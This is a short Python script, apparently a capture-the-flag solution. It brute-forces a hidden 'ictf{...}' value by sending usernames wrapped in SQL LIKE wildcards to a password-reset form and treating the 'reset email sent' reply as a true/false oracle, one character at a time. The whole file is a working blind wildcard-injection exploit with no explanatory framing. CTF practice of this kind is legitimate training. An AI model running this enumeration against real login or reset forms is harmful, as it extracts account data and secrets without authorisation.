import requests
def _(arg,end='\n'):
    pass
debug = _
host = 'http://like-it-or-not.031337.xyz'
guess = 'ictf{'
payload = list(guess+' '*40)
idx = len(guess)
asciz = list('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0987654321_{}')
while True:
    try:
        for c in asciz:
            flag = ''.join(e for e in ['%']+payload[:idx]+[c]+['%'])
            r = requests.post(host, data={'username':flag})
            debug(f"Trying: {flag}==> [{r.status_code}]: {r.text}")
            if 'Password reset email sent' in r.text:
                print(f"Valid flag: {flag[1:-1]}")
                payload[idx] = c
                idx += 1
                if flag[-2] == '}':
                    print(f"flag: {''.join(e for e in payload[:])}")
                    exit(0)
                break
            elif 'ictf{' in r.text:
                print(f'got: {r.text}')
                exit(0)
            else:
                continue
    except Exception as e:
        print(f"Exception: {e}")
